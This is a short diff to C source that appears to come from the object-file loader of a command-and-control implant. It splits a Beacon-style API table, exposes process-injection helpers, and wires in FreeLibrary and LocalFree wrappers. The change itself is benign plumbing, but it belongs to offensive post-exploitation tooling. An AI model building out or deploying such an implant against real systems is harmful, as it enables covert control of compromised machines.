@@ -34,7 +34,12 @@ PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
 
 BOOL LdrFreeLibrary( HMODULE hLibModule )
 {
-    return TRUE;
+    return Instance.Win32.FreeLibrary( hLibModule );
+}
+
+HLOCAL LdrLocalFree( PVOID hMem )
+{
+    return Instance.Win32.LocalFree( hMem );
 }
 
 COFFAPIFUNC BeaconApi[] = {
@@ -61,11 +66,17 @@ COFFAPIFUNC BeaconApi[] = {
         { .NameHash = COFFAPI_BEACONINJECTTEMPORARYPROCESS, .Pointer = BeaconInjectTemporaryProcess     },
         { .NameHash = COFFAPI_BEACONCLEANUPPROCESS,         .Pointer = BeaconCleanupProcess             },
 
+        // End of array
+        { .NameHash = NULL, .Pointer = NULL },
+};
+
+COFFAPIFUNC LdrApi[] = {
         { .NameHash = COFFAPI_TOWIDECHAR,                   .Pointer = toWideChar                       },
         { .NameHash = COFFAPI_LOADLIBRARYA,                 .Pointer = LdrModuleLoad                    },
         { .NameHash = COFFAPI_GETMODULEHANDLE,              .Pointer = LdrModulePebString               },
         { .NameHash = COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
-        { .NameHash = COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   }, // TODO: add this
+        { .NameHash = COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   },
+        { .NameHash = COFFAPI_LOCALFREE,                    .Pointer = LdrLocalFree                     },
 
         // End of array
         { .NameHash = NULL, .Pointer = NULL },
